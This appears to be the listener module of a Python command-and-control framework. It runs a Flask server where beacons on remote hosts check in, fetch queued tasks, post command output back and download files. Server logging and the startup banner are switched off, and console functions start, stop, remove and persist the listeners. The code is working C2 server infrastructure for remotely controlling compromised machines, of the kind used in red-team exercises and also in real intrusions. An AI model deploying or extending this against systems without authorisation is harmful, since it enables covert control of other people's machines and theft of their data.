from db import *
from util import *
from cryptor import *
from beacon import *

import os
import sys
import flask
import pickle
import threading
#import netifaces
import logging

from collections import OrderedDict
from multiprocessing import Process
from random import choice
from string import ascii_uppercase
from shutil import rmtree

listeners = OrderedDict()  # OrderedDirct preserves the order of inserted keys

class Listener:
    def __init__(self, name, port, ipAddress):
        self.name           = name
        self.port           = port
        self.ipAddress      = ipAddress
        self.isRunning      = False

        self.listenerPath   = f'db/listener/{self.name}/'
        self.encKeyPath     = f'{self.listenerPath}key'
        self.filePath       = f'{self.listenerPath}file/'
        self.beaconPath     = f'{self.listenerPath}beacon/'

        self.app            = flask.Flask(__name__)

        if os.path.exists(self.listenerPath) == False:
            os.mkdir(self.listenerPath)
        if os.path.exists(self.filePath) == False:
            os.mkdir(self.filePath)
        if os.path.exists(self.beaconPath) == False:
            os.mkdir(self.beaconPath)
        if os.path.exists(self.encKeyPath) == False:
            # Generating a random 32-bit base64'd key
            key = generateKey()
            self.key = key
            with open(self.encKeyPath, "wt") as f:
                f.write(key)
        else:
            with open(self.encKeyPath, "rt") as f:
                self.key = f.read()

        @self.app.route("/byakuya", methods=['POST'])
        def beaconAdd():
            name        = ''.join(choice(ascii_uppercase) for i in range(10))
            beaconIp    = flask.request.remote_addr
            hostname    = flask.request.form.get("name")
            beaconType  = flask.request.form.get("type")

            # Save checked-in beacon to DB
            success(f'Beacon {name} checked in!')
            writeToDB(beaconsDB, Beacon(name, self,name, beaconIp, hostname, beaconType, self.key))

            return name

        @self.app.route("/tasks/<name>", methods=['GET'])
        def executeTasks(name):
            if os.path.exists(f'{self.beaconPath}/{name}/tasks'):
                with open(f'{self.beaconPath}/{name}/tasks', "r") as f:
                    beaconTask = f.read()
                clearBeaconTaks(name)
                return(beaconTask, 200)
            else:
                return('', 204) # 204 = No Content

        @self.app.route("/results/<name>", methods=['POST'])
        def receiveOutput(name):
            result = flask.request.form.get("result")
            outputResults(name, result)
            return('', 204) # 204 = No Content

        @self.app.route("/download/<name>", methods=['GET'])
        def downloadFile(name):
            file = open(f'{self.filePath}{name}', "rt")
            data = file.read()
            file.close()
            return(data, 200)

    # Running server
    def run(self):
        log = logging.getLogger('werkzeug')
        log.disabled = True
        self.app.run(host=self.ipAddress, port=self.port)

    # Set flag
    def flag(self):
        self.flag = 1

    # Start server
    def start(self):
        self.server = Process(target = self.run)

        cmd = sys.modules['flask.cli']
        cmd.show_server_banner = lambda *x: None

        self.daemon = threading.Thread(name = self.name, target = self.server.start, args=())
        self.daemon.daemon = True
        self.daemon.start()
        self.isRunning = True

    # Stop server
    def stop(self):
        self.server.terminate()
        self.server = None
        self.daemon = None
        self.isRunning = False


# Chcking if listeners are empty
def checkListenerEmpty(flag):
    if len(listeners) == 0:
        if flag == 1:
            error("No listeners are active!")
            return True
        else:
            return True
    else:
        return False

def activeListener():
    listener_list = []
    for i in listeners:
        listener_list.append(listeners[i].name)
    return listener_list

# Checking if listeners exist
def checkListenerExist(name, flag):
    listener_exist = activeListener()
    if name in listener_exist:
        return True
    else:
        if flag == 1:
            error("Invalid listener!")
            return False
        else:
            return False

# Listing listeners
def listListener():
    if checkListenerEmpty(1) == False:
        success("Active listeners: ")
        print("-" * 93)
        print('| {:<20} | {:<20} | {:<20} | {:<20} |'.format("Listner Name", "IP", "Port", "Status"))
        print("-" * 93)
        for i in listeners:
            if listeners[i].isRunning == True:
                status = "Active"
            else:
                status = "Stopped"
            print('| {:<20} | {:<20} | {:<20} | {:<20} |'.format(listeners[i].name, listeners[i].ipAddress, str(listeners[i].port), status))
        print("-" * 93)
        print(" ")

# Start listeners
def startListener(args):
    # Existing listener name to resume it
    if len(args) == 1:
        name = args[0]
        if listeners[name].isRunning == False:
            try:
                listeners[name].start()
                success(f'Started listener {name}!')
            except:
                error("Invalid listener name entered!")
        else:
            error(f'listener {name} is already active!')
    else:
        if len(args) != 3:
            error("Invalid arguments! (eg., [ listeners ] > start <name> <IP> <port>)")
        else:
            name = args[0]

            try:
                ipAddress = args[1]
            except:
                error("Invalid argument entered! (eg., [ listeners ] > start <name> <IP> <port>)")
                return 0

            try:
                port = int(args[2])
            except:
                error("Invalid port entered! (eg., [ listeners ] > start <name> <IP> <port>)")
                return 0

            # Getting IP Address via interface
            # interface = args[2]

            # try:
            #     netifaces.ifaddresses(interface)
            #     ipAddress = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
            # except:
            #     error("Invalid interface entered! (eg., [ listeners ] > start <name> 1337 eth0)")
            #     return 0

            if checkListenerExist(name, 0):
                error(f'listener {name} already exists!')
            else:
                listeners[name] = Listener(name, port, ipAddress)
                progress(f'Starting listener {name} on {ipAddress}:{port}')

                try:
                    listeners[name].start()
                    success(f'listener {name} started!')
                except:
                    error("Failed to start listener...")
                    del listeners[name]

# Stop listener
def stopListener(args):
    if len(args) != 1:
        error("Invalid arguments! (eg., [ listeners ] > stop <name>)")
    else:
        name = args[0]
        if checkListenerExist(name, 1):
            if listeners[name].isRunning == True:
                progress(f'Stopping listener {name}')
                listeners[name].stop()
                success("listener successfully stopped!")
            else:
                error(f'listener {name} is already stopped!')
        else:
            pass

# Remove listener
def removeListener(args):
    if len(args) != 1:
        error("Invalid arguments! (eg., [ listeners ] > remove <name>)")
    else:
        name = args[0]
        if checkListenerExist(name, 1):
            listenersBeacon = assignListenerForBeacon(name)
            for i in listenersBeacon:
                removeBeacon([i])

            rmtree(listeners[name].listenerPath)

            if listeners[name].isRunning == True:
                stopListener([name])
                del listeners[name]
                success("listener succssfully removed!")
            else:
                del listeners[name]
                success("listener succssfully removed!")
        else:
            pass

# Save listener
def saveListener():
    if len(listeners) == 0:
        purgeDB(listenersDB)
    else:
        data = OrderedDict()
        purgeDB(listenersDB)

        for i in listeners:
            if listeners[i].isRunning == True:
                name        = listeners[i].name
                port        = str(listeners[i].port)
                ipAddress   = listeners[i].ipAddress
                flag        = "1"
                data[name]  = name + " " + port + " " + ipAddress + " " + flag

                listeners[i].stop()
            else:
                name        = listeners[i].name
                port        = str(listeners[i].port)
                ipAddress   = listeners[i].ipAddress
                flag        = "0"
                data[name]  = name + " " + port + " " + ipAddress + " " + flag
        writeToDB(listenersDB, data)

# Load listener
def loadListener():
    if os.path.exists(listenersDB):
        data = readFromDB(listenersDB)
        temp = data[0]

        for i in temp:
            i = temp[i].split()

            name        = i[0]
            port        = int(i[1])
            ipAddress   = i[2]
            flag        = i[3]

            listeners[name] = Listener(name, port, ipAddress)

            if flag == "1":
                listeners[name].start()
    else:
        pass
